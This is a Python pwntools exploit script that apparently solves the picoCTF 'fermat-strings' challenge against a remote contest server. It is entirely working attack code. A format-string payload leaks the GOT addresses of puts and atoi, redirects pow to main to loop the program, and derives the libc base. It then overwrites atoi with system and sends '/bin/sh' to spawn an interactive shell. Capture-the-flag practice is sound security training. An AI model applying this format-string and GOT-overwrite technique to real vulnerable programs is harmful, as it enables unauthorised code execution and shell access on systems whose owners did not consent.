from pwn import *

def start():
    return remote('mars.picoctf.net', 31929)
def send_payload(io, a, b):
    log.info(f"Sending:\nA:\n{a}\nB:\n{hexdump(b)}")
    io.recvuntil(b'A: ')
    io.sendline(a)
    io.recvuntil(b'B: ')
    io.sendline(b)

def send_format(io, format, values):
    format_prefix = b'111_'
    values_prefix = b'1111111_'
    send_payload(io, format_prefix + format, values_prefix + values)
    out = io.recvline()
    arr = out.split(b" and ")
    res = arr[0].replace(b"Calculating for A: " + format_prefix, b"")
    log.info(f"Received:\n{hexdump(res)}")
    return res

if args.LOCAL:
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
else:
    libc = ELF("D:/NTU/CTF/PicoCTF/PWN/fermat-strings/libc6_2.31-0ubuntu9.1_amd64.so")

io = start()
exe = ELF("D:/NTU/CTF/PicoCTF/PWN/fermat-strings/chall")
log.info(f"puts() GOT address: {hex(exe.got['puts'])}")
log.info(f"atoi() GOT address: {hex(exe.got['atoi'])}")

fmt_first_offset = 43

loop_main_fmt, loop_main_address = fmtstr_split(fmt_first_offset + 2, {exe.got["pow"]: exe.symbols["main"]}, numbwritten = 0x25)
io = start()
output = send_format(io, f"%{fmt_first_offset}$s.%{fmt_first_offset + 1}$s.".encode("ascii") + loop_main_fmt, p64(exe.got["puts"]) + p64(exe.got["atoi"]) + loop_main_address)
puts_addr_str, atoi_addr_str, *rest = output.split(b".")
puts_addr = int.from_bytes(puts_addr_str, "little") 
log.info(f"puts() runtime address: {hex(puts_addr)}")
atoi_addr = int.from_bytes(atoi_addr_str, "little") 
log.info(f"atoi() runtime address: {hex(atoi_addr)}")


libc.address = puts_addr - libc.symbols["puts"]
assert(libc.address & 0xFFF == 0)

log.info(f"LibC base address: {hex(libc.address)}")
raw_input()
atoi_to_system_fmt, atoi_to_system_address = fmtstr_split(fmt_first_offset, {exe.got["atoi"]: libc.symbols["system"]}, numbwritten = 0x17)
send_format(io, atoi_to_system_fmt, atoi_to_system_address)

send_payload(io, "/bin/sh", "dummy")

io.interactive()